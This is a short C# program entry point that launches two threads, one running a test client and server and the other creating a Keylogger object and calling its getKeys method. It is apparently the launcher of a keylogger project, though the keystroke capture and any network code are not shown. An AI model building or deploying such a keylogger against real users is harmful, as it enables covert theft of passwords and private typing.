using System.Windows.Forms;
using System.Threading;


Thread t = new Thread((ThreadStart)(() => {
    Test_client.test_client();
    Test_client.Test_server();
   
}));

Thread t2 = new Thread((ThreadStart)(() => {
    Keylogger kl = new Keylogger();
    kl.getKeys();

}));


t.SetApartmentState(ApartmentState.STA);
t.Start();
t2.SetApartmentState(ApartmentState.STA);
t2.Start();
t.Join();
t2.Join();

